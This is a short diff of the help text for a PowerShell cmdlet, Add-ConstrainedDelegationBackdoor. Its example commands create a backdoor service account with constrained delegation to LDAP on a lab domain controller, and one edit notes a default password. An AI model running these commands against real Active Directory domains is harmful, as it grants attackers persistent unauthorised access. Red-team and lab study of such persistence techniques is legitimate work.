@@ -44,8 +44,8 @@ Backdoor serviceprincipalname which is set on the target user object so that del
 Principle Name of the service which the backdoor service account is allowed to delegate to 
 
 .EXAMPLE
-PS > Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Password d1ive@Dubhe -Domain lab.local -AllowedToDelegateTo ldap/DC.lab.local
-Use above command to create a new backdoor service account named "backdoor"
+PS > Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain lab.local -AllowedToDelegateTo ldap/DC.lab.local
+Use above command to create a new backdoor service account named "backdoor" with password Password@123!
 
 .EXAMPLE
 PS > Add-ConstrainedDelegationBackdoor -SamAccountName iis_svc -Domain lab.local -AllowedToDelegateTo ldap/DC.lab.local
